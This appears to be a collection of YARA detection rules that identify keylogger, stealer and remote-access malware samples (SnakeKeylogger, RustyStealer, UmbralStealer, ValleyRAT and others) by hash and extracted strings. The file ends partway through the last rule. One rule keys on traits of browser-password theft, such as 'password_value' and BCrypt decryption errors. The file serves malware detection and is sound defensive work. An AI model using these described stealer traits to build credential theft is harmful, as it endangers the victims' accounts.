rule _SnakeKeylogger_signature__1a41b236e54319b64f65b4f667766e1e_imphash__SnakeKeylogger_signature__799e73863806df2964d80d12ce4e6_58 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe, SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
      hash2 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
   strings:
      $s1 = "?StartProcessWithMojoIPC@PwaHelperImpl@edge_pwahelper@@QEAAKPEAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '27.00'*/
      $s2 = "DumpHungProcessWithPtype_ExportThunk" fullword ascii /* score: '25.00'*/
      $s3 = "?StartProcessWithMojoIPC@PwaHelperImpl@edge_pwahelper@@QEAAKPEAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '23.00'*/
      $s4 = "EdgeGetInjectionMitigationStatus" fullword ascii /* score: '19.00'*/
      $s5 = "IsTemporaryUserDataDirectoryCreatedForHeadless" fullword ascii /* score: '19.00'*/
      $s6 = "?InitializeAppUserModelIdForCurrentProcess@PwaHelperImpl@edge_pwahelper@@QEAA_NXZ" fullword ascii /* score: '18.00'*/
      $s7 = "GetInstallDetailsPayload" fullword ascii /* score: '18.00'*/
      $s8 = "InjectDumpForHungInput_ExportThunk" fullword ascii /* score: '17.00'*/
      $s9 = "IsBrowserProcess" fullword ascii /* score: '15.00'*/
      $s10 = "?BindWidgetManager@PwaHelperImpl@edge_pwahelper@@AEAAXV?$ScopedHandleBase@VMessagePipeHandle@mojo@@@mojo@@@Z" fullword ascii /* score: '15.00'*/
      $s11 = "?SetSingletonProcessId@PwaHelperImpl@edge_pwahelper@@UEAAXI@Z" fullword ascii /* score: '15.00'*/
      $s12 = "GetUploadConsent_ExportThunk" fullword ascii /* score: '14.00'*/
      $s13 = "?StartAppWithPlatformChannel@PwaHelperImpl@edge_pwahelper@@QEAAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '12.00'*/
      $s14 = "GetUserDataDirectoryThunk" fullword ascii /* score: '12.00'*/
      $s15 = "GetProductInfo_ExportThunk" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__6aa7899735e1f990142bacb29f0dd_59 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
   strings:
      $s1 = "*ComputePublicKeyToken" fullword ascii /* score: '12.00'*/
      $s2 = "6TryGetTypeTemplate_Internal" fullword ascii /* score: '12.00'*/
      $s3 = "&ReflectionExecution'" fullword ascii /* score: '12.00'*/
      $s4 = "Q=C$EventLogPermission0EventLogPermissionAccess6EventLogPermissionAttribute.EventLogPermissionEntryBEventLogPermissionEntryColle" ascii /* score: '12.00'*/
      $s5 = "2GetStructUnsafeStructSize<GetForwardDelegateCreationStub" fullword ascii /* score: '10.00'*/
      $s6 = "@<ComputeMethodSignatureHashCode" fullword ascii /* score: '10.00'*/
      $s7 = " 4<get_CustomAttributes>d__7" fullword ascii /* score: '9.00'*/
      $s8 = "B\"FINDEX_SEARCH_OPS,GET_FILEEX_INFO_LEVELS" fullword ascii /* score: '9.00'*/
      $s9 = " .CryptographicOperations" fullword ascii /* score: '9.00'*/
      $s10 = "Q=C$EventLogPermission0EventLogPermissionAccess6EventLogPermissionAttribute.EventLogPermissionEntryBEventLogPermissionEntryColle" ascii /* score: '9.00'*/
      $s11 = "HTryGetMethodMetadataFromStartAddress" fullword ascii /* score: '8.00'*/
      $s12 = "&GetAddressFromIndex@" fullword ascii /* score: '8.00'*/
      $s13 = "(GetRuntimeTypeHandle" fullword ascii /* score: '8.00'*/
      $s14 = "=C NativeLayoutInfo&FieldAccessMetadata0VirtualResolveDataResult(MethodInvokeMetadata" fullword ascii /* score: '8.00'*/
      $s15 = "<GetInlinedThreadStaticBaseSlowFGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__54e8aab77a741ddbe4f0e1d5294d2_60 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash3 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash4 = "96cdecba4b523f512f7b3e2ad2d234f379fc2bdfd6d6b0b1499e7ee34f498341"
      hash5 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash6 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
      hash7 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash8 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash9 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s2 = "Templates* DesktopDirectory" fullword ascii /* score: '15.00'*/
      $s3 = "\"IcuInitSortHandle2GetIsAsciiEqualityOrdinal IcuCompareString" fullword ascii /* score: '12.00'*/
      $s4 = "get_ValueVSystem.Threading.IAsyncLocal.OnValueChanged@" fullword ascii /* score: '11.00'*/
      $s5 = "CommonTemplatesZ" fullword ascii /* score: '11.00'*/
      $s6 = "UserProfileP*CommonProgramFilesX86X" fullword ascii /* score: '10.00'*/
      $s7 = "System.Console" fullword ascii /* score: '10.00'*/
      $s8 = "TryFormat8System.IFormattable.ToString$IsWhiteSpaceLatin1" fullword ascii /* score: '10.00'*/
      $s9 = "GetValue@" fullword ascii /* score: '9.00'*/
      $s10 = "ttern(get_ShortTimePattern6get_GeneralShortTimePattern4get_GeneralLongTimePattern2get_DateTimeOffsetPattern(get_YearMonthPattern" ascii /* score: '9.00'*/
      $s11 = "GetMonthName:get_UnclonedYearMonthPatterns:get_UnclonedShortDatePatterns8get_UnclonedLongDatePatterns(get_DecimalSeparator*Initi" ascii /* score: '9.00'*/
      $s12 = "GetEraName\"get_DateSeparator.get_FullDateTimePattern&get_LongDatePattern&get_LongTimePattern&get_MonthDayPattern(get_ShortDateP" ascii /* score: '9.00'*/
      $s13 = "GetMonthName:get_UnclonedYearMonthPatterns:get_UnclonedShortDatePatterns8get_UnclonedLongDatePatterns(get_DecimalSeparator*Initi" ascii /* score: '9.00'*/
      $s14 = "GetNext@" fullword ascii /* score: '9.00'*/
      $s15 = ":InternalGetGenitiveMonthNames:InternalGetLeapYearMonthNames.GetAbbreviatedMonthName" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__e028dd160a9b25bfd157794a3702c831_imphash__RustyStealer_signature__e028dd160a9b25bfd157794a3702c831__61 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash).exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_14198cd5.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_25fc7620.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_32496cbe.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_385d4a90.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_9a6e7696.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_ba6656dc.exe, RustyStealer(signature)_ebfcafca4943e1084db2c03154f3d02d(imphash).exe, VenomRAT(signature)_97c0c9d944f961cc568fd7bef1c71fdc(imphash).sys, XWorm(signature)_fd07fba8b12ffe7192d601c00a748022(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9032cfc2074c405dbcb967bfda8c8295d34db4f6cf56727d3a2f7fe4ce49abd9"
      hash2 = "14198cd53c85c8cdf6b19b3c915844bf51cea45b29133e20011dcdd754a1beae"
      hash3 = "25fc762046ac2e9fbb698eef51b0881d7b3af3e2038bf8c252004426a6af2f75"
      hash4 = "32496cbe8cc3943df120b5c8522e8e5b46c3b15f998353665a9c14a3c6d29ae6"
      hash5 = "385d4a9087e5c893d20a0fc259c492a1c78deee237918c95daf2acee8cd491c1"
      hash6 = "9a6e76963ad89a35960d46f32eec730c47e73598614a5e4bbc38b925ef4922e0"
      hash7 = "ba6656dc06382c80e283c8a587cbfc05f59fc6937dd1033663153889127915c2"
      hash8 = "9fbae971ce5aae1971daaecdd459e7a49b8c5a2e54bf66ffbf8fed01126cd966"
      hash9 = "f3a30e693eb0a3ea54c91e6e7e7ba3082967083be9e9034da54c4dd967a01dc1"
      hash10 = "39a43ccb4d5295214586a645cfd977031be5680cad5a316db4326c42ba3d91fd"
   strings:
      $x1 = "bcryptprimitives.dll" fullword ascii /* reversed goodware string 'lld.sevitimirptpyrcb' */ /* score: '33.00'*/
      $s2 = "ectedaddress in useaddress not availablenetwork downbroken pipeentity already existsoperation would blocknot a directoryis a dir" ascii /* score: '20.00'*/
      $s3 = "ddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesystemLoopStale" ascii /* score: '17.00'*/
      $s4 = "NetworkFileHandleInvalidInputInvalidDataTimedOutWriteZeroStorageFullNotSeekableQuotaExceededFileTooLargeResourceBusyExecutableFi" ascii /* score: '16.00'*/
      $s5 = "assertion failed: edge.height == self.node.height - 1" fullword ascii /* score: '15.00'*/
      $s6 = "assertion failed: edge.height == self.height - 1" fullword ascii /* score: '15.00'*/
      $s7 = "Once instance has previously been poisoned" fullword ascii /* score: '14.00'*/
      $s8 = "library\\std\\src\\sync\\poison\\once.rs" fullword ascii /* score: '14.00'*/
      $s9 = "entity not foundpermission deniedconnection refusedconnection resethost unreachablenetwork unreachableconnection abortednot conn" ascii /* score: '14.00'*/
      $s10 = "Attempted to access thread-local data while allocating said data." fullword ascii /* score: '13.00'*/
      $s11 = "NotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnectedAddrInUseA" ascii /* score: '12.00'*/
      $s12 = "too largeresource busyexecutable file busydeadlockcross-device link or renametoo many linksinvalid filenameargument list too lon" ascii /* score: '12.00'*/
      $s13 = "fatal runtime error: " fullword ascii /* score: '10.00'*/
      $s14 = "assertion failed: src.len() == dst.len()" fullword ascii /* score: '10.00'*/
      $s15 = "fatal runtime error: an irrecoverable error occurred while synchronizing threads, aborting" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__54e8aab77a741ddbe4f0e1d5294d2_62 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash3 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash4 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash5 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
      hash6 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash7 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash8 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "$System.Console.dllDSystem.Diagnostics.FileVersionInfo" fullword ascii /* score: '19.00'*/
      $s2 = "The output char buffer is too small to contain the decoded characters, encoding '{0}' fallback '{1}'" fullword wide /* score: '18.00'*/
      $s3 = "The output byte buffer is too small to contain the encoded data, encoding '{0}' fallback '{1}'" fullword wide /* score: '16.00'*/
      $s4 = "&GetReadNotSupported&GetSeekNotSupported(GetWriteNotSupported" fullword ascii /* score: '15.00'*/
      $s5 = "GetKeyHashCode GetValueHashCode@" fullword ascii /* score: '15.00'*/
      $s6 = "4get_CompletedSynchronously" fullword ascii /* score: '12.00'*/
      $s7 = " ThreadEntryPoint>InitializeComForFinalizerThread@InitializeComForThreadPoolThread" fullword ascii /* score: '10.00'*/
      $s8 = "GetString@" fullword ascii /* score: '9.00'*/
      $s9 = "GetDataItem@" fullword ascii /* score: '9.00'*/
      $s10 = "&SetDefaultFallbacks GetByteCountFast@" fullword ascii /* score: '9.00'*/
      $s11 = ",get_IsOutputRedirected" fullword ascii /* score: '9.00'*/
      $s12 = ",GetEnvironmentVariable" fullword ascii /* score: '9.00'*/
      $s13 = "GetEncoding2FilterDisallowedEncodings" fullword ascii /* score: '9.00'*/
      $s14 = "WriteLineD<get_Out>g__EnsureInitialized|26_0b<get_IsOutputRedirected>g__EnsureInitialized|36_0" fullword ascii /* score: '9.00'*/
      $s15 = "$GetPerformanceData" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__383df94d_UmbralStealer_signature__f34d5f2d4577ed6d9ceec_63 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_383df94d.exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c6ff6203.exe, UmbralStealer(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_cd38ac65.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "383df94d827ca5b3e76452c9c7646dcdc84c1eee505c8ffd09a564eb00256117"
      hash2 = "234dae6411b0a2ceb80b3b2f552adc69f9ae369864279c5b6111d722534b13f8"
      hash3 = "c6ff62032c39ff25b2171f16b6bc9caa9d0f9b3a2e733899ffc78c628c788a76"
      hash4 = "cd38ac659e7c2d3ad28705c52c281983b28f4683e81bd61f3ba166b7c61cbc74"
   strings:
      $s1 = "BCrypt.BCryptDecrypt() (get size) failed with status code: {0}" fullword wide /* score: '17.00'*/
      $s2 = "BCrypt.BCryptGetProperty() (get size) failed with status code:{0}" fullword wide /* score: '15.00'*/
      $s3 = "BCrypt.BCryptGetProperty() failed with status code:{0}" fullword wide /* score: '15.00'*/
      $s4 = "BCrypt.BCryptImportKey() failed with status code:{0}" fullword wide /* score: '13.00'*/
      $s5 = "BCrypt.BCryptDecrypt() failed with status code:{0}" fullword wide /* score: '12.00'*/
      $s6 = "password_value" fullword wide /* score: '12.00'*/
      $s7 = "BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}" fullword wide /* score: '10.00'*/
      $s8 = "BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}" fullword wide /* score: '10.00'*/
      $s9 = "record_header_field" fullword ascii /* score: '9.00'*/
      $s10 = "BCrypt.BCryptDecrypt(): authentication tag mismatch" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 800KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( all of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__087fa31dc7d77feb208c5dda56c8c_64 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_087fa31dc7d77feb208c5dda56c8c688(imphash).exe, SnakeKeylogger(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe, SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9154058d1dfc0a0203928a4ed25ab791(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash).exe, SnakeKeylogger(signature)_b069d88b33e75313d6c2f825eb1f4188(imphash)_8ac1fdc4.exe, SnakeKeylogger(signature)_b4d3f5d989eff50a07c3a8d85868cba4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "a24110da2d42316258533bbff2c7c9852baa87bbb92be9f1bbc2858035d1cb76"
      hash3 = "37599b38dcbe50dd01c413d2c5aeccc6582d640cf81ad4eb1f5877ed25c40d5d"
      hash4 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash5 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash6 = "fc7b617c0317fa605e60e44a35bc6f6fb0e5d30b0cd5b0127034069bf5810317"
      hash7 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
      hash8 = "26d35dab5514132671d904227e1b2306054138b3e84fe04bf6b7af1c0bfe0505"
      hash9 = "8ac1fdc40a9f98635a344803303fbd13bea0ec3c04c7570764382c31c2eeb8b6"
      hash10 = "c24f664303cf46a812706b9e98d3f714c9fd2eac83a54ad2e53681f103438b2d"
   strings:
      $s1 = "Must complete Convert() operation or call Encoder.Reset() before calling GetBytes() or GetByteCount(). Encoder '{0}' fallback '{" wide /* score: '15.00'*/
      $s2 = "The target file '{0}' is a directory, not a file" fullword wide /* score: '14.00'*/
      $s3 = "get_AsyncState\\System.IAsyncResult.get_CompletedSynchronously*get_ExceptionRecorded&get_CapturedContext@" fullword ascii /* score: '11.00'*/
      $s4 = "4System.IDisposable.Dispose" fullword ascii /* score: '10.00'*/
      $s5 = "GetEncoder@" fullword ascii /* score: '9.00'*/
      $s6 = " InternalGetValue@" fullword ascii /* score: '9.00'*/
      $s7 = "GetCharsFast@" fullword ascii /* score: '9.00'*/
      $s8 = "GetBytesFast@" fullword ascii /* score: '9.00'*/
      $s9 = "6InternalGetCodePageDataItem" fullword ascii /* score: '9.00'*/
      $s10 = "BDrainRemainingDataForGetByteCount@" fullword ascii /* score: '9.00'*/
      $s11 = " GetCharCountFast@" fullword ascii /* score: '9.00'*/
      $s12 = "DecodeFirstRune@" fullword ascii /* score: '9.00'*/
      $s13 = "TryGetByteCount@" fullword ascii /* score: '9.00'*/
      $s14 = "The stream is currently in use by a previous operation on the stream" fullword wide /* score: '9.00'*/
      $s15 = ">LogFinishCompletionNotification" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__01d357eecc71f4f0078f9b283e83da99_imphash__SnakeKeylogger_signature__54e8aab77a741ddbe4f0e1d5294d2_65 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature)_01d357eecc71f4f0078f9b283e83da99(imphash).exe, SnakeKeylogger(signature)_54e8aab77a741ddbe4f0e1d5294d2ba8(imphash).exe, SnakeKeylogger(signature)_6aa7899735e1f990142bacb29f0dd5de(imphash).exe, SnakeKeylogger(signature)_9500a3099a7bd06339507f7c4c55ecd8(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "05b3f0bb496b998361f8bad6586ab07432cb52d1b4414ce403a00648571b531e"
      hash2 = "f8343679b868073000380e233f32b10a04a9b4f3e28e7eb7bf58107566f9043c"
      hash3 = "664e90e815ce56b91d51e107d0bb76b4bc5e4ae3ff57de6ce99635f6357771b5"
      hash4 = "74a40d2f809116abb9da9d754950e8ef484c6344087718d6f12ee36dff4db768"
   strings:
      $s1 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s2 = "DecoderDBCS\"ProcessWaitHandle4SYSTEM_PROCESS_INFORMATIONS" fullword ascii /* score: '17.00'*/
      $s3 = "@GetRuntimeMethodHandleComponents>GetRuntimeFieldHandleComponents" fullword ascii /* score: '15.00'*/
      $s4 = "BGetStringFromMemoryInNativeFormatDGetRuntimeFieldHandleForComponents@" fullword ascii /* score: '15.00'*/
      $s5 = "nSystem.Collections.Generic.IEnumerable<T>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s6 = "Save&ComputeNameHashCode" fullword ascii /* score: '10.00'*/
      $s7 = "VThrowNotSupportedException_UnseekableStreamVThrowNotSupportedException_UnreadableStreamVThrowNotSupportedException_UnwritableSt" ascii /* score: '10.00'*/
      $s8 = ",get_InvalidCultureName:get_FormattedInvalidCultureIdPInternalGetAbbreviatedDayOfWeekNamesCore:InternalGetDayOfWeekNamesCoreHInt" ascii /* score: '9.00'*/
      $s9 = "\"GetLeadByteRanges" fullword ascii /* score: '9.00'*/
      $s10 = ",get_InvalidCultureName:get_FormattedInvalidCultureIdPInternalGetAbbreviatedDayOfWeekNamesCore:InternalGetDayOfWeekNamesCoreHInt" ascii /* score: '9.00'*/
      $s11 = " CombineSelectors" fullword ascii /* score: '9.00'*/
      $s12 = ".ThrowEndOfFileException0CreateEndOfFileException<ThrowInvalidOperationException" fullword ascii /* score: '9.00'*/
      $s13 = " CombineSelectorsY" fullword ascii /* score: '9.00'*/
      $s14 = "\"get_ClockDateTime" fullword ascii /* score: '9.00'*/
      $s15 = "SetLeftoverData@DrainLeftoverDataForGetCharCount@" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RustyStealer_signature__e028dd160a9b25bfd157794a3702c831_imphash__RustyStealer_signature__e028dd160a9b25bfd157794a3702c831__66 {
   meta:
      description = "_subset_batch - from files RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash).exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_14198cd5.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_25fc7620.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_32496cbe.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_385d4a90.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_9a6e7696.exe, RustyStealer(signature)_e028dd160a9b25bfd157794a3702c831(imphash)_ba6656dc.exe, RustyStealer(signature)_ebfcafca4943e1084db2c03154f3d02d(imphash).exe, VenomRAT(signature)_97c0c9d944f961cc568fd7bef1c71fdc(imphash).sys"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "9032cfc2074c405dbcb967bfda8c8295d34db4f6cf56727d3a2f7fe4ce49abd9"
      hash2 = "14198cd53c85c8cdf6b19b3c915844bf51cea45b29133e20011dcdd754a1beae"
      hash3 = "25fc762046ac2e9fbb698eef51b0881d7b3af3e2038bf8c252004426a6af2f75"
      hash4 = "32496cbe8cc3943df120b5c8522e8e5b46c3b15f998353665a9c14a3c6d29ae6"
      hash5 = "385d4a9087e5c893d20a0fc259c492a1c78deee237918c95daf2acee8cd491c1"
      hash6 = "9a6e76963ad89a35960d46f32eec730c47e73598614a5e4bbc38b925ef4922e0"
      hash7 = "ba6656dc06382c80e283c8a587cbfc05f59fc6937dd1033663153889127915c2"
      hash8 = "9fbae971ce5aae1971daaecdd459e7a49b8c5a2e54bf66ffbf8fed01126cd966"
      hash9 = "f3a30e693eb0a3ea54c91e6e7e7ba3082967083be9e9034da54c4dd967a01dc1"
   strings:
      $s1 = "failed to spawn thread" fullword ascii /* score: '18.00'*/
      $s2 = "library\\std\\src\\sys\\process\\windows.rs" fullword ascii /* score: '15.00'*/
      $s3 = "lock count overflow in reentrant mutexlibrary\\std\\src\\sync\\reentrant_lock.rs" fullword ascii /* score: '15.00'*/
      $s4 = "comparing environment keys failed: " fullword ascii /* score: '13.00'*/
      $s5 = "Local\\RustBacktraceMutex00000000" fullword ascii /* score: '11.00'*/
      $s6 = "internal error: entered unreachable code/rustc/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\library\\std\\src\\sys\\thread_local\\n" ascii /* score: '11.00'*/
      $s7 = "internal error: entered unreachable code/rustc/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\library\\std\\src\\sys\\thread_local\\n" ascii /* score: '11.00'*/
      $s8 = "library\\std\\src\\sys\\pal\\windows\\pipe.rs" fullword ascii /* score: '10.00'*/
      $s9 = "RUST_MIN_STACKfatal runtime error: something here is badly broken!, aborting" fullword ascii /* score: '10.00'*/
      $s10 = "s\\??\\PIPE\\" fullword wide /* score: '10.00'*/
      $s11 = "failed printing to " fullword ascii /* score: '9.00'*/
      $s12 = "too many running threads in thread scope" fullword ascii /* score: '9.00'*/
      $s13 = ".exeprogram not found" fullword ascii /* score: '8.00'*/
      $s14 = "/rustc/29483883eed69d5fb4db01964cdf2af4d86e9cb2\\library\\std\\src\\thread\\local.rs" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _SalatStealer_signature__351592d5ead6df0859b0cc0056827c95_imphash__ValleyRAT_signature__15d53913ba494ccc61512607f46fddf4_imp_67 {
   meta:
      description = "_subset_batch - from files SalatStealer(signature)_351592d5ead6df0859b0cc0056827c95(imphash).exe, ValleyRAT(signature)_15d53913ba494ccc61512607f46fddf4(imphash).exe, ValleyRAT(signature)_15d53913ba494ccc61512607f46fddf4(imphash)_1e647e0f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "73c4d642eea0d8b2f9e8fa2f6328d5a94a9c929681063fdf6c7560d0c721efee"
      hash2 = "a226d9a4f1456774355d091f2f680286508e204dfecc9b439697140ac41ecb23"
      hash3 = "1e647e0ff0bc7a5dcfe1577093e2182fed5ffb01b6d18ebeec9d2d0a98fd19fa"
   strings:
      $s1 = "VCRUNTIME140.dll" fullword wide /* score: '26.00'*/
      $s2 = "VCRUNTIME140_1.dll" fullword wide /* score: '23.00'*/
      $s3 = "%ls\\ucrtbase.dll" fullword wide /* score: '20.00'*/
      $s4 = "Path of ucrtbase.dll (%ls) and its name exceed buffer size (%d)." fullword wide /* score: '19.00'*/
      $s5 = "Failed to set _PYI_PARENT_PROCESS_LEVEL environment variable!" fullword ascii /* score: '18.00'*/
      $s6 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" fullword ascii /* score: '15.00'*/
